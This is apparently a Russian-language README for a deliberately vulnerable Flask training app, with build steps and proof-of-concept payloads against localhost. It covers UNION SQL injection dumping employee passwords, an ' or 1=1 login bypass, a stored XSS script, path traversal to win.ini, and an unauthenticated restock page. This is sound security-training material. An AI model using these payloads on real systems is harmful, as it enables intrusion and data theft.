# Уязвимая версия приложения

### Инструкция по сборке и запуску приложения

> - git clone "текущий репозиторий"
> - cd flask-app
> - python main.py
> - flask приложение будет запущено по адресу http://127.0.0.1:5000

> ![image](https://github.com/medarov411/flask-app/assets/60567375/5ed27505-01d5-4842-b756-d0771948cae6)



### Proof of Concept

SQLI:

> url - http://127.0.0.1:5000. Поисковая система

> payload: juice' UNION SELECT username,password,3 from employees;--

> ![image](https://github.com/medarov411/flask-app/assets/60567375/adda836e-7a51-4e64-9086-11bdf1dc5921)
 

> url - http://127.0.0.1:5000/login. Авторизация

> Если авторизация прошла успешно, происходит редирект на /restock(Страница добавления товара)

> Payload: ' or 1=1--

> ![image](https://github.com/medarov411/flask-app/assets/60567375/f6fd0e67-7147-4359-8efc-b4aa90d8349e)

<p>&nbsp;</p>

XSS(stored):
> xss эксплуатируется на странице добавления товара

> http://127.0.0.1:5000/restock

> payload: <script>alert("xss")</script>

> ![image](https://github.com/medarov411/flask-app/assets/60567375/b3bfa591-d097-40fa-9326-9ab75fb8727b)

> ![image](https://github.com/medarov411/flask-app/assets/60567375/a99611be-129c-4bb3-a276-5b69a514c20d)
 



<p>&nbsp;</p>

Path Traversal:
> кнопка Read Policy на главной странице "http://127.0.0.1:5000/" ведет на url "http://127.0.0.1:5000/view_file?filename=15020.pdf"

> пейлоад:http://127.0.0.1:8089/view_file?filename=../../../../../windows/win.ini

> ![image](https://github.com/medarov411/flask-app/assets/60567375/a18bdcc9-360a-43fa-a936-e72d26813112)


<p>&nbsp;</p>

Broken access control:
> здесь broken access в том, что неавторизованный пользователь имеет доступ к функционалу добавления товара

> http://127.0.0.1:5000/restock
